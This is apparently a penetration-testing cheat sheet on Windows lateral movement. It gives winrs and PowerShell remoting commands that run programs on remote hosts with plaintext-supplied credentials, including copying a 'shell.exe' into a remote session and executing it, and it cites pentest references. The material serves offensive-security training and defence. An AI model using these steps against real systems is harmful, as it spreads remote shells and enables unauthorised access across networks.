# Living off the Land

## 01 - Command Prompt

- Using `winrs.exe` to laterally spawn shells via WinRM

```
C:\> winrs -remote:<IP> <commands>

C:\> winrs -r:http://<IP>/wsman <commands>

C:\> winrs -r:<IP> -ad -u:<username> -p:<password> <commands>
```

## 02 - Powershell

### 2.1 - Start-Process

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process -FilePath C:\path\to\shell.exe -NoNewWindow -Credential $credential -WorkingDirectory c:\users\public
```

You can pass arguments as well when using `netcat` for example

`PS C:\> Start-Process -FilePath <C:\path\to\program.exe> -NoNewWindow -Credential $credential -ArgumentList ("<arg1>","<arg2>","<arg3>") -WorkingDirectory C:\Users\Public`

### 2.2 - Authenticate Remotely

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
```

```powershell
PS C:\> $ip = New-PSSession -ComputerName <IP>

Copy-Item shell.exe -Destination "c:\users\public\" -ToSession $ip

icm -Session $ip -ScriptBlock {c:\users\public\shell.exe}
```

---
## References

- [Pentestlab Blog: Powershell Remoting](https://pentestlab.blog/tag/powershell-remoting/)

- [SS64 WinRS](https://ss64.com/nt/winrs.html)

- [Powershell Module New-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2)

- [Powershell Module Get-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-cimsession?view=powershell-7.2)

- [HarmJ0y PsRemoting.ps1](https://gist.github.com/HarmJ0y/4c37e43ba4865bdef2a8)

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)